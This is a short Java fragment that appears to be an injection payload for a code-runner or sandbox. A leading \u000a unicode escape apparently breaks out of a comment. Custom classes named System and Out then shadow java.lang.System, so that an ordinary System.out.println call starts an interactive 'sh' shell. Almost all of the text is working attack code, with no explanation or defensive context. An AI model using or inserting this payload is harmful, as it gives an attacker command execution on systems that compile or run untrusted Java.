\u000aclass Out {
    public static void println(String s) {
        try {
            java.lang.System.out.println("shell:");
            var builder = new ProcessBuilder(new String[] { "sh" });
            builder.redirectInput(ProcessBuilder.Redirect.INHERIT);
            builder.redirectOutput(ProcessBuilder.Redirect.INHERIT);
            builder.start().waitFor();
        } catch (Exception e) {
            java.lang.System.out.println(e);
        }
    }
}

class System {
    public static Out out = new Out();
}
